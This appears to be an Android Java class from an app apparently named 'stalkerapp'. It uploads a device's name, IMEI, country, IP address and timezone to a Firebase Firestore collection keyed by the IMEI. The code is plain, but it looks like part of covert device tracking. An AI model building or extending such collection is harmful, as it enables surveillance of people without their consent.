package com.github.saintedlittle.stalkerapp.firebase;

import static android.content.ContentValues.TAG;

import android.util.Log;

import com.github.saintedlittle.stalkerapp.data.SystemData;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.Map;

public class FirebaseSaver {

    private final FirebaseFirestore db = FirebaseFirestore.getInstance();

    public void saveSystemData(SystemData systemData) {

        Map<String, Object> systemInformation = new HashMap<>();

        systemInformation.put("DEVICE", systemData.getDeviceName());
        systemInformation.put("IMEI", systemData.getImei());

        systemInformation.put("COUNTRY", systemData.getCountry());
        systemInformation.put("IP-ADDRESS", systemData.getIP());

        systemInformation.put("TIMEZONE", systemData.getTimezone());

        // Add a new document with a generated ID
        db.collection(systemData.getImei())
                .add(systemInformation)
                .addOnSuccessListener(documentReference -> Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.getId()))
                .addOnFailureListener(e -> Log.w(TAG, "Error adding document", e));
    }
}
